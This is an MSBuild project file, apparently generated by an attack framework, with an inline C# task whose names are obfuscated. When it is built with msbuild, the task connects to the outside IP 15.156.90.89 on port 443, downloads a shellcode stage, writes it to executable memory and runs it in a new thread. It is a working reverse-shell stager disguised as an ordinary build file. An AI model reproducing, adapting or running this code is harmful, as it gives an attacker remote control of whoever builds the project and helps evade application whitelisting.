<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
        <Target Name="QWoRKtr">
            <fbJlkK />
          </Target>
          <UsingTask
            TaskName="fbJlkK"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
        using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class fbJlkK : Task, ITask {
                [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 eorGHY,UInt32 UJKtujicjcvfzXH, UInt32 bhPccnaKRwIY, UInt32 VQxVHYesfySFTjo);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 iWHkzpYX, UInt32 AMzAKdYkSEdeU, UInt32 sNQmrRGyZxM,IntPtr nFwPxF, UInt32 BpJPtKgNChb, ref UInt32 wunszVmCtkJg);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr pvFliVcSeouvGWC, UInt32 LhsCDCmcWUo);
static byte[] zcKWwqkr(string jkdjzBuAL, int nbBvqoTsUeNO) {
    IPEndPoint UosIUMCICPPOSQL = new IPEndPoint(IPAddress.Parse(jkdjzBuAL), nbBvqoTsUeNO);
    Socket shHcfdlfXZzIKKZ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    try { shHcfdlfXZzIKKZ.Connect(UosIUMCICPPOSQL); }
    catch { return null;}
    byte[] DTvlBrZQIZmZE = new byte[4];
    shHcfdlfXZzIKKZ.Receive(DTvlBrZQIZmZE, 4, 0);
    int FVgycFvpD = BitConverter.ToInt32(DTvlBrZQIZmZE, 0);
    byte[] HTLdeXdLFLEknht = new byte[FVgycFvpD + 5];
    int aAiyebkYhngM = 0;
    while (aAiyebkYhngM < FVgycFvpD)
    { aAiyebkYhngM += shHcfdlfXZzIKKZ.Receive(HTLdeXdLFLEknht, aAiyebkYhngM + 5, (FVgycFvpD - aAiyebkYhngM) < 4096 ? (FVgycFvpD - aAiyebkYhngM) : 4096, 0);}
    byte[] iOfrVWP = BitConverter.GetBytes((int)shHcfdlfXZzIKKZ.Handle);
    Array.Copy(iOfrVWP, 0, HTLdeXdLFLEknht, 1, 4); HTLdeXdLFLEknht[0] = 0xBF;
    return HTLdeXdLFLEknht;}
static void rsLDtAIm(byte[] WfyFKywKaAEkgyG) {
    if (WfyFKywKaAEkgyG != null) {
        UInt32 noyENMJDuJO = VirtualAlloc(0, (UInt32)WfyFKywKaAEkgyG.Length, 0x1000, 0x40);
        Marshal.Copy(WfyFKywKaAEkgyG, 0, (IntPtr)(noyENMJDuJO), WfyFKywKaAEkgyG.Length);
        IntPtr hodWyVNqEUXZ = IntPtr.Zero;
        UInt32 zfEmzVNCAfUYI = 0;
        IntPtr bcOzayKxccbziJ = IntPtr.Zero;
        hodWyVNqEUXZ = CreateThread(0, 0, noyENMJDuJO, bcOzayKxccbziJ, 0, ref zfEmzVNCAfUYI);
        WaitForSingleObject(hodWyVNqEUXZ, 0xFFFFFFFF); }}

public override bool Execute()
{
    byte[] LpSZIKKHdV = null; LpSZIKKHdV = zcKWwqkr("15.156.90.89", 443);
    rsLDtAIm(LpSZIKKHdV);

return true;            }       }
                                ]]>
                        </Code>
                </Task>
        </UsingTask>
</Project>                                    
